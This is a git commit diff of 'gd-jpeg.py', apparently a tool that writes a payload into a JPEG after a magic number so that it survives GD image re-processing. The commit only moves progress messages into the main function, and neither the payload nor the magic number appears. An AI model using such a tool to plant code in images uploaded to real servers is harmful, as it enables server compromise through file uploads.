eed494862df08dce41fe312914660f240e558aeb
moodule <moodule@protonmail.com>
2020-09-05 14:41:23 +0200

    Move feedback to the main

--- gd-jpeg.py
+++ gd-jpeg.py
@@ -16,40 +16,37 @@ def main():
 
     with open(path_to_vector_image, 'rb') as vector_file:
         bin_vector_data = vector_file.read()
+
+        print("[ ] Searching for magic number...")
         magic_number_index = find_magic_number_index(bin_vector_data)
 
         if magic_number_index >=0:
+            print("[+] Found magic number.")
             with open(path_to_output, 'wb') as infected_file:
+                print("[ ] Injecting payload...")
                 infected_file.write(
                     inject_payload(
                         bin_vector_data,
                         magic_number_index,
                         payload_code))
+                print("[+] Payload written.")
+        else:
+            print("[-] Magic number not found. Exiting.")
 
 def find_magic_number_index(
         data: bytes) -> int:
-    print("[ ] Searching for magic number...")
-    index = data.find(binascii.unhexlify(MAGIC_NUMBER))
-
-    if index >= 0:
-        print("[+] Found magic number.")
-    else:
-        print("[-] Magic number not found. Exiting.")
-
-    return index
+    return data.find(binascii.unhexlify(MAGIC_NUMBER))
 
 def inject_payload(
         vector: bytes,
         index: int,
         payload: str) -> bytes:
 
-    print("Injecting payload...")
     bin_payload = bin(int(binascii.hexlify(payload), 16))
     bin_magic_number = binascii.unhexlify(MAGIC_NUMBER)
 
     pre_payload = vector[:index + len(bin_magic_number)]
     post_payload = vector[index + len(bin_magic_number) + len(bin_payload):]
-    print("Payload written.")
 
     return (pre_payload + bin_payload + post_payload + '\n')
 
